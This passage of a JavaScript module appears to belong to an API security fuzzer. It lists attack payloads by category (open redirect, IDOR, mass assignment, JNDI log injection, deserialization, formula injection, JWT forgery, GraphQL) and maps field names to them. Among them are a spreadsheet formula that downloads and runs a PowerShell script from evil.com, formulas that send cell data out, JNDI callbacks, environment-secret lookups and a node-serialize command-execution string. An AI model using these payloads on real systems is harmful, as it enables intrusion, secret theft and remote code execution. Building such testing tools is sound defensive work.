    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
];

// ═══════════════════════════════════════════════════════════════
//  16. Open Redirect (15 payloads)
// ═══════════════════════════════════════════════════════════════
const OPEN_REDIRECT = [
    // ── Basic redirects ──
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "/\\evil.com",
    "////evil.com",
    "https:evil.com",
    "///evil.com",
    "http:evil.com",
    "\\evil.com",
    "\\\\evil.com",

    // ── Credential / authority confusion ──
    "http://evil.com@trusted.com",
    "http://trusted.com.evil.com",
    "http://trusted.com%40evil.com",
    "http://trusted.com%2F@evil.com",
    "http://evil.com%23@trusted.com",
    "http://evil.com\\@trusted.com",
    "//trusted.com@evil.com",

    // ── Encoding bypass ──
    "//evil.com/%2f%2e%2e",
    "%2f%2fevil.com",
    "%2f%2f%2fevil.com",
    "%00//evil.com",
    "/%09/evil.com",
    "/%5cevil.com",
    "//%2Fevil.com",
    "http%3A%2F%2Fevil.com",

    // ── Protocol-based ──
    "javascript:alert(document.domain)",
    "data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL2V2aWwuY29tJzwvc2NyaXB0Pg==",
    "javascript:void(0)",
    "vbscript:msgbox",

    // ── Path confusion ──
    "/redirect?url=http://evil.com",
    "//evil.com/..;/",
    "/..;/evil.com",
    "/evil.com/%2e%2e",
    "/.evil.com",

    // ── CRLF-based redirect ──
    "%0d%0aLocation:%20http://evil.com",
    "%0d%0aLocation:%20http://evil.com%0d%0a",
    "%E5%98%8A%E5%98%8DLocation:%20http://evil.com",
];

// ═══════════════════════════════════════════════════════════════
//  17. IDOR / Broken Object Level Authorization (15 payloads)
// ═══════════════════════════════════════════════════════════════
const IDOR = [
    // ── Sequential ID enumeration ──
    "1",
    "0",
    "-1",
    "2",
    "100",
    "999",
    "9999",
    "99999",
    "1000000",
    "2147483647",
    "-2147483648",

    // ── MongoDB ObjectId manipulation ──
    "000000000000000000000001",
    "000000000000000000000000",
    "ffffffffffffffffffffffff",
    "AAAAAAAAAAAAAAAAAAAAAAAA",
    "111111111111111111111111",
    "507f1f77bcf86cd799439011",
    "507f1f77bcf86cd799439012",
    "507f191e810c19729de860ea",
    "deadbeefdeadbeefdeadbeef",
    "aaaaaaaaaaaaaaaaaaaaaaaa",

    // ── UUID manipulation ──
    "00000000-0000-0000-0000-000000000000",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
    "550e8400-e29b-41d4-a716-446655440000",

    // ── NoSQL operator injection for IDOR ──
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"$in": ["1","2","3","admin"]}',

    // ── Type confusion IDOR ──
    "null",
    "undefined",
    "true",
    "false",
    "NaN",
    "Infinity",
    "admin",
    "root",
    "self",
    "me",
    "current",

    // ── Path traversal IDOR ──
    "../../../../etc/passwd",
    "../1",
    "./1",
];

// ═══════════════════════════════════════════════════════════════
//  18. Mass Assignment / Parameter Pollution (15 payloads)
// ═══════════════════════════════════════════════════════════════
const MASS_ASSIGNMENT = [
    // ── Role / privilege escalation ──
    '{"role": "admin"}',
    '{"role": "superadmin"}',
    '{"role": "root"}',
    '{"role": "system"}',
    '{"isAdmin": true}',
    '{"is_admin": true}',
    '{"admin": true}',
    '{"is_staff": true}',
    '{"is_superuser": true}',
    '{"user_type": "admin"}',
    '{"access_level": 999}',
    '{"privilege": "all"}',

    // ── Account state manipulation ──
    '{"verified": true}',
    '{"email_verified": true}',
    '{"active": true}',
    '{"approved": true}',
    '{"banned": false}',
    '{"suspended": false}',
    '{"status": "approved"}',
    '{"account_type": "premium"}',
    '{"plan": "enterprise"}',
    '{"subscription": "lifetime"}',

    // ── Financial manipulation ──
    '{"price": 0}',
    '{"price": -1}',
    '{"price": 0.01}',
    '{"discount": 100}',
    '{"discount": 99.99}',
    '{"quantity": 999999}',
    '{"balance": 999999}',
    '{"credit": 999999}',
    '{"total": 0}',
    '{"fee": 0}',

    // ── Credential overwrite ──
    '{"password": "hacked"}',
    '{"email": "attacker@evil.com"}',
    '{"phone": "+1234567890"}',
    '{"permissions": ["*"]}',
    '{"permissions": "all"}',
    '{"scope": "admin:all"}',
    '{"api_key": "attacker_key"}',
    '{"reset_token": "known_token"}',

    // ── Internal field overwrite ──
    '{"_id": "000000000000000000000001"}',
    '{"__v": 0}',
    '{"createdAt": "2020-01-01"}',
    '{"updatedAt": "2099-01-01"}',
    '{"deletedAt": null}',
];

// ═══════════════════════════════════════════════════════════════
//  19. ReDoS — Regular Expression Denial of Service (25 payloads)
// ═══════════════════════════════════════════════════════════════
const REDOS = [
    // ── Exponential backtracking ──
    "a".repeat(30) + "!",
    "a".repeat(50) + "!",
    "a".repeat(100) + "!",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
    "aaaaaaaaaa@aaaaaaaaaa.com!",
    "a]a]a]a]a]a]a]a]a]a]a]a]a]a]!",
    "0".repeat(50) + "x",
    "1".repeat(50) + "a",

    // ── Email-style ReDoS ──
    "a".repeat(30) + "@" + "a".repeat(30) + ".com!",
    "a@a.a".repeat(20) + "!",
    ("a".repeat(20) + "@") + "b".repeat(20) + "." + "c".repeat(20),
    "test+" + ".".repeat(100) + "@evil.com",

    // ── URL-style ReDoS ──
    "http://" + "a".repeat(50) + ":".repeat(50),
    "http://a" + "/a".repeat(100) + "!",

    // ── Nested quantifier triggers ──
    "(a+)+",
    "([a-zA-Z]+)*",
    "(a|aa)+",
    "(a|a?)+",
    "(.*a){20}",

    // ── Common ReDoS patterns in input ──
    " ".repeat(50) + "a",
    "\t".repeat(100) + "x",
    "a]a".repeat(50),
    ("x" + " ").repeat(100),

    // ── JSON-like ReDoS ──
    "{" + '"a":"b",'.repeat(100) + "}",
    "[" + '"a",'.repeat(200) + "]",
];

// ═══════════════════════════════════════════════════════════════
//  20. Log Injection / Log Forging (20 payloads)
// ═══════════════════════════════════════════════════════════════
const LOG_INJECTION = [
    // ── Newline injection ──
    "test\nINFO: Admin logged in successfully",
    "test\r\n[CRITICAL] System breach detected",
    "test\nWARNING: Unauthorized access from 127.0.0.1",
    "test\n[ERROR] Database connection failed",
    "test\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html",

    // ── ANSI escape sequences ──
    "test\x1b[31mERROR\x1b[0m",
    "test\x1b[2J",
    "test\x1b[H\x1b[2J",
    "\x1b]2;Hacked\x07",

    // ── Log format injection ──
    "${jndi:ldap://evil.com/a}",
    "${jndi:rmi://evil.com/a}",
    "${jndi:dns://evil.com/a}",
    "${jndi:ldap://127.0.0.1:1389/a}",
    "%(user)s logged in",
    "${env:AWS_SECRET_ACCESS_KEY}",
    "${sys:java.version}",
    "${main:0}",
    "${hostName}",
    "${date:YYYY-MM-dd}",
    "%{user}i",
];

// ═══════════════════════════════════════════════════════════════
//  21. HTTP Parameter Pollution (20 payloads)
// ═══════════════════════════════════════════════════════════════
const HTTP_PARAM_POLLUTION = [
    // ── Duplicate parameters ──
    "value1&key=value2",
    "admin&role=user",
    "test&admin=true",
    "value&__proto__[admin]=1",

    // ── Array notation abuse ──
    "value1&key[]=value2",
    "value1&key[0]=value2",
    "admin[]",
    "admin[0]",

    // ── Express.js specific ──
    "value1,value2",
    "value1, value2",
    "[value1,value2]",

    // ── Delimiter confusion ──
    "value1;key=value2",
    "value1|value2",
    "value1%00value2",
    "value1%0avalue2",
    "value1%26key%3Dvalue2",

    // ── JSON in query string ──
    '{"key":"value","admin":true}',
    '[1,2,3]',
    '{"$gt":""}',
    'true',
];

// ═══════════════════════════════════════════════════════════════
//  22. JSON Injection / Deserialization (25 payloads)
// ═══════════════════════════════════════════════════════════════
const JSON_INJECTION = [
    // ── Malformed JSON ──
    '{"key": "value"',
    '{"key": "value"}}',
    '{key: "value"}',
    "{'key': 'value'}",
    '{"key": undefined}',
    '{"key": NaN}',
    '{"key": Infinity}',
    '{,}',
    '{"": ""}',
    '{"key": "val\\u0000ue"}',

    // ── Nested / deep JSON ──
    '{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":"deep"}}}}}}}}',
    '{"a":' + '['.repeat(50) + '1' + ']'.repeat(50) + '}',

    // ── Large key/value ──
    '{"' + 'a'.repeat(10000) + '": "value"}',
    '{"key": "' + 'x'.repeat(100000) + '"}',

    // ── Node.js deserialization ──
    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
    '{"__proto__":{"test":"test"}}',
    '{"constructor":{"prototype":{"test":"test"}}}',

    // ── Duplicate keys ──
    '{"key":"value1","key":"value2"}',
    '{"admin":false,"admin":true}',
    '{"role":"user","role":"admin"}',

    // ── Unicode escape abuse ──
    '{"ke\\u0079": "value"}',
    '{"\\u005f\\u005fproto\\u005f\\u005f": {"admin": true}}',

    // ── Comment injection ──
    '{"key":"value"/*comment*/}',
    '{"key":"value"}//comment',
    '{"key":"va/**/lue"}',
];

// ═══════════════════════════════════════════════════════════════
//  23. CSV / Formula Injection (15 payloads)
// ═══════════════════════════════════════════════════════════════
const CSV_INJECTION = [
    "=cmd|'/C calc'!A0",
    "=cmd|'/C powershell IEX(wget evil.com/shell.ps1)'!A0",
    "+cmd|'/C calc'!A0",
    "-cmd|'/C calc'!A0",
    "@SUM(1+1)*cmd|'/C calc'!A0",
    "=1+cmd|'/C calc'!A0",
    "=HYPERLINK(\"http://evil.com?c=\"&A1,\"Click\")",
    "=IMPORTXML(\"http://evil.com?c=\"&A1,\"//a\")",
    "=IMPORTDATA(\"http://evil.com\")",
    "=IMAGE(\"http://evil.com\")",
    "DDE(\"cmd\",\"/C calc\",\"!A0\")",
    "\t=cmd|'/C calc'!A0",
    "\r\n=cmd|'/C calc'!A0",
    ";=cmd|'/C calc'!A0",
    "\"=cmd|'/C calc'!A0",
];

// ═══════════════════════════════════════════════════════════════
//  24. Email Header Injection (15 payloads)
// ═══════════════════════════════════════════════════════════════
const EMAIL_INJECTION = [
    "test@evil.com\r\nBcc: attacker@evil.com",
    "test@evil.com\nCc: attacker@evil.com",
    "test@evil.com%0aBcc:attacker@evil.com",
    "test@evil.com%0d%0aBcc:attacker@evil.com",
    "test@evil.com\r\nSubject: Hacked",
    "test@evil.com\r\n\r\nInjected body",
    "test@evil.com%0AContent-Type:text/html%0A%0A<h1>Injected</h1>",
    "\"test\\\"@evil.com",
    "test@evil.com\nTo: victim@target.com",
    "test+tag@evil.com",
    "test@[127.0.0.1]",
    "test@evil.com\r\nX-Mailer: injected",
    "<script>alert(1)</script>@evil.com",
    "test@evil.com\nMIME-Version: 1.0\nContent-Type: multipart/mixed",
    "a]@evil.com",
];

// ═══════════════════════════════════════════════════════════════
//  25. CORS Misconfiguration Testing (15 payloads)
// ═══════════════════════════════════════════════════════════════
const CORS_MISCONFIG = [
    "https://evil.com",
    "http://evil.com",
    "null",
    "https://trusted.com.evil.com",
    "https://trustedcom.evil.com",
    "https://evil-trusted.com",
    "https://trusted.com%60.evil.com",
    "https://trusted.com%2F.evil.com",
    "http://localhost",
    "http://127.0.0.1",
    "https://evil.com\r\nX-Injected: true",
    "file://",
    "https://trusted.com\\.evil.com",
    "https://trusted.com%00.evil.com",
    "chrome-extension://evil",
];

// ═══════════════════════════════════════════════════════════════
//  26. Business Logic / Boundary Values (25 payloads)
// ═══════════════════════════════════════════════════════════════
const BUSINESS_LOGIC = [
    // ── Numeric boundaries ──
    0,
    -1,
    -0.01,
    0.001,
    -999999,
    999999999,
    1e20,
    -1e20,
    1e-10,
    Number.MAX_SAFE_INTEGER,
    Number.MAX_SAFE_INTEGER + 1,
    Number.MIN_SAFE_INTEGER,
    Number.MIN_SAFE_INTEGER - 1,

    // ── String boundaries ──
    "",
    " ",
    "0",
    "-0",
    "00",
    "01",
    "001",

    // ── Date/time abuse ──
    "1970-01-01",
    "2099-12-31",
    "0000-00-00",
    "9999-99-99",
    "2024-13-32T99:99:99Z",
];

// ═══════════════════════════════════════════════════════════════
//  27. GraphQL Injection (20 payloads)
// ═══════════════════════════════════════════════════════════════
const GRAPHQL_INJECTION = [
    // ── Introspection ──
    '{"query":"{ __schema { types { name } } }"}',
    '{"query":"{ __schema { queryType { name } mutationType { name } } }"}',
    '{"query":"{ __type(name: \\"User\\") { fields { name type { name } } } }"}',
    '{"query":"{ __schema { directives { name description } } }"}',

    // ── Field suggestion / enumeration ──
    '{"query":"{ user { id email password passwordHash role isAdmin } }"}',
    '{"query":"{ users { id email role } }"}',
    '{"query":"mutation { updateUser(id: 1, role: \\"admin\\") { id } }"}',
    '{"query":"mutation { deleteUser(id: 1) { id } }"}',

    // ── Batch query (DoS) ──
    '{"query":"query { a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename }"}',

    // ── Nested query (DoS) ──
    '{"query":"{ user { posts { comments { user { posts { comments { user { id } } } } } } } }"}',

    // ── Injection in variables ──
    '{"query":"query($id:ID!){user(id:$id){name}}","variables":{"id":"1 OR 1=1"}}',
    '{"query":"query($name:String!){user(name:$name){id}}","variables":{"name":"{\\"$gt\\": \\"\\"}"}}',
    '{"query":"query($search:String!){users(search:$search){id}}","variables":{"search":"<script>alert(1)</script>"}}',

    // ── Alias-based attacks ──
    '{"query":"{ a1:user(id:1){id} a2:user(id:2){id} a3:user(id:3){id} }"}',

    // ── Fragment abuse ──
    '{"query":"{ ...on User { id email role password } }"}',
    '{"query":"fragment f on User { id email } { user { ...f } }"}',

    // ── Directive injection ──
    '{"query":"{ user @include(if: true) { id password } }"}',
    '{"query":"{ user @deprecated { id email } }"}',

    // ── Subscription abuse ──
    '{"query":"subscription { userChanged { id email role } }"}',
];

// ═══════════════════════════════════════════════════════════════
//  28. JWT Attacks (20 payloads)
// ═══════════════════════════════════════════════════════════════
const JWT_ATTACKS = [
    // ── Algorithm none ──
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.",
    "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
    "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
    "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",

    // ── Algorithm confusion (RS256 → HS256) ──
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",

    // ── Weak secrets ──
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",

    // ── Empty / malformed ──
    "",
    ".",
    "..",
    "...",
    "invalid.token.here",
    "aaa.bbb.ccc",
    "eyJhbGciOiJIUzI1NiJ9..invalid",

    // ── Expired / manipulated claims ──
    "eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjB9.invalid",
    "eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjk5OTk5OTk5OTl9.invalid",
    "eyJhbGciOiJIUzI1NiJ9.eyJpYXQiOjB9.invalid",

    // ── Header injection ──
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJyb2xlIjoiYWRtaW4ifQ.",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrIjoiYXR0YWNrZXJfa2V5In19.eyJyb2xlIjoiYWRtaW4ifQ.",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9ldmlsLmNvbS9qd2tzIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9ldmlsLmNvbS9jZXJ0In0.eyJyb2xlIjoiYWRtaW4ifQ.",
];

// ═══════════════════════════════════════════════════════════════
//  ALL CATEGORIES GROUPED
// ═══════════════════════════════════════════════════════════════
const PAYLOAD_CATEGORIES = {
    sql_injection: SQL_INJECTION,
    nosql_injection: NOSQL_INJECTION,
    xss: XSS,
    command_injection: COMMAND_INJECTION,
    path_traversal: PATH_TRAVERSAL,
    ssrf: SSRF,
    template_injection: TEMPLATE_INJECTION,
    xxe: XXE,
    ldap_injection: LDAP_INJECTION,
    header_injection: HEADER_INJECTION,
    prototype_pollution: PROTOTYPE_POLLUTION,
    type_confusion: TYPE_CONFUSION,
    overflow: OVERFLOW,
    special_chars: SPECIAL_CHARS,
    auth_bypass: AUTH_BYPASS,
    open_redirect: OPEN_REDIRECT,
    idor: IDOR,
    mass_assignment: MASS_ASSIGNMENT,
    redos: REDOS,
    log_injection: LOG_INJECTION,
    http_param_pollution: HTTP_PARAM_POLLUTION,
    json_injection: JSON_INJECTION,
    csv_injection: CSV_INJECTION,
    email_injection: EMAIL_INJECTION,
    cors_misconfig: CORS_MISCONFIG,
    business_logic: BUSINESS_LOGIC,
    graphql_injection: GRAPHQL_INJECTION,
    jwt_attacks: JWT_ATTACKS,
};

/**
 * Returns all payload categories relevant to a given field name.
 * Uses keyword matching on the field name to select targeted payloads.
 */
function inferCategoriesFromFieldName(fieldName) {
    const name = fieldName.toLowerCase();
    const categories = new Set();

    // Always test these baseline categories
    categories.add("special_chars");
    categories.add("type_confusion");

    // ── Identity / auth fields ──
    if (/email|user|login|name|account|username|nick/.test(name)) {
        categories.add("sql_injection");
        categories.add("nosql_injection");
        categories.add("xss");
        categories.add("auth_bypass");
        categories.add("ldap_injection");
    }

    if (/pass|password|secret|token|key|apikey|api_key|auth|credential/.test(name)) {
        categories.add("sql_injection");
        categories.add("nosql_injection");
        categories.add("auth_bypass");
    }

    // ── Free-text / search fields ──
    if (/search|query|q|filter|keyword|term|text|comment|body|content|message|description|title|note|subject|bio|about/.test(name)) {
        categories.add("sql_injection");
        categories.add("nosql_injection");
        categories.add("xss");
        categories.add("command_injection");
        categories.add("template_injection");
        categories.add("overflow");
    }

    // ── URL / redirect fields ──
    if (/url|link|href|src|redirect|callback|next|return|goto|dest|uri|webhook|endpoint|origin/.test(name)) {
        categories.add("ssrf");
        categories.add("open_redirect");
        categories.add("path_traversal");
        categories.add("header_injection");
        categories.add("xss");
    }

    // ── File / path fields ──
    if (/file|filename|upload|attachment|image|document|path|dir|folder|resource|asset/.test(name)) {
        categories.add("path_traversal");
        categories.add("command_injection");
        categories.add("xxe");
    }

    // ── Command / execution fields ──
    if (/cmd|command|exec|run|shell|system|process|script|action|operation/.test(name)) {
        categories.add("command_injection");
        categories.add("template_injection");
    }

    // ── ID / reference fields ──
    if (/id|_id|userid|serverid|server_id|objectid|ref|uuid|guid/.test(name)) {
        categories.add("sql_injection");
        categories.add("nosql_injection");
        categories.add("idor");
    }

    // ── Network / server fields ──
    if (/domain|host|ip|address|server|port|hostname|fqdn/.test(name)) {
        categories.add("ssrf");
        categories.add("command_injection");
        categories.add("header_injection");
    }

    // ── Template / rendering fields ──
    if (/template|render|view|layout|theme|format|pattern|expression/.test(name)) {
        categories.add("template_injection");
        categories.add("xss");
    }

    // ── Role / permission fields ──
    if (/role|admin|permission|access|privilege|group|scope|level|type|plan|tier/.test(name)) {
        categories.add("auth_bypass");
        categories.add("mass_assignment");
        categories.add("nosql_injection");
    }

    // ── Data / XML / JSON fields ──
    if (/xml|data|payload|input|config|settings|options|params|body|raw|soap/.test(name)) {
        categories.add("xxe");
        categories.add("prototype_pollution");
        categories.add("sql_injection");
    }

    // ── Price / quantity / financial fields ──
    if (/price|amount|cost|qty|quantity|total|discount|balance|credit|payment|fee/.test(name)) {
        categories.add("mass_assignment");
        categories.add("type_confusion");
    }

    // ── Status / state fields ──
    if (/status|state|active|verified|approved|enabled|published|visible/.test(name)) {
        categories.add("mass_assignment");
        categories.add("auth_bypass");
    }

    // ── HTML / display fields ──
    if (/html|display|output|label|tag|class|style|css|color/.test(name)) {
        categories.add("xss");
        categories.add("template_injection");
    }

    // ── LDAP-specific fields ──
    if (/dn|ldap|cn|ou|dc|samaccount|memberof/.test(name)) {
        categories.add("ldap_injection");
    }

    // ── Header / cookie fields ──
    if (/header|cookie|referer|referrer|agent|useragent|x-forwarded|origin/.test(name)) {
        categories.add("header_injection");
        categories.add("xss");
        categories.add("cors_misconfig");
    }

    // ── Email fields ──
    if (/email|mail|smtp|recipient|sender|from|to|cc|bcc/.test(name)) {
        categories.add("email_injection");
        categories.add("xss");
        categories.add("redos");
    }

    // ── Token / JWT fields ──
    if (/token|jwt|bearer|authorization|session|apikey|api_key|access_token|refresh_token/.test(name)) {
        categories.add("jwt_attacks");
        categories.add("auth_bypass");
    }

    // ── Log / audit fields ──
    if (/log|audit|event|message|comment|note|reason|description/.test(name)) {
        categories.add("log_injection");
        categories.add("xss");
    }

    // ── Export / report fields ──
    if (/export|csv|report|download|filename|file_name/.test(name)) {
        categories.add("csv_injection");
        categories.add("path_traversal");
    }

    // ── JSON / data payload fields ──
    if (/json|payload|data|body|request|response|content/.test(name)) {
        categories.add("json_injection");
        categories.add("prototype_pollution");
    }

    // ── Query / parameter fields (HPP) ──
    if (/param|query|args|argument|option|field|value|input/.test(name)) {
        categories.add("http_param_pollution");
        categories.add("redos");
    }

    // ── GraphQL fields ──
    if (/graphql|query|mutation|subscription|schema|introspect/.test(name)) {
        categories.add("graphql_injection");
    }

    // ── Numeric / financial fields (business logic) ──
    if (/amount|price|quantity|total|count|limit|offset|page|size|rate|score|weight|age/.test(name)) {
        categories.add("business_logic");
        categories.add("type_confusion");
    }

    // If no specific context matched beyond baseline, use a general set
    if (categories.size <= 2) {
        categories.add("sql_injection");
        categories.add("xss");
        categories.add("overflow");
        categories.add("nosql_injection");
    }

    return [...categories];
}

/**
 * Collect payloads for a field, drawing from all inferred categories.
 */
function getPayloadsForField(fieldName, fieldType) {
    if (fieldType === "number" || fieldType === "integer") {
        return PAYLOAD_CATEGORIES.type_confusion.filter(v => typeof v === "number" || v === null);
    }

    const categories = inferCategoriesFromFieldName(fieldName);
    const payloads = [];
    const seen = new Set();

    for (const cat of categories) {
        for (const payload of (PAYLOAD_CATEGORIES[cat] || [])) {
            const key = typeof payload === "string" ? payload : JSON.stringify(payload);
            if (!seen.has(key)) {
                seen.add(key);
                payloads.push(payload);
            }
        }
    }

    return payloads;
}

module.exports = {
    PAYLOAD_CATEGORIES,
    inferCategoriesFromFieldName,
    getPayloadsForField,
};
